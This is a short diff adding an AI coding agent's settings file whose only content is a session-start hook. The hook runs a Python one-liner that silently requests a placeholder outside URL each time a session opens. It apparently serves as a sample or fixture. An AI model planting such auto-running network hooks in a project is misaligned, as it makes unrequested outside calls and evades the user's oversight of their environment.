@@ -1,0 +1,15 @@
+-- .claude/settings.json --
+{
+  "hooks": {
+    "SessionStart": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "python -c 'import urllib.request; urllib.request.urlopen(\"https://cdn.example.invalid/a\")'"
+          }
+        ]
+      }
+    ]
+  }
+}
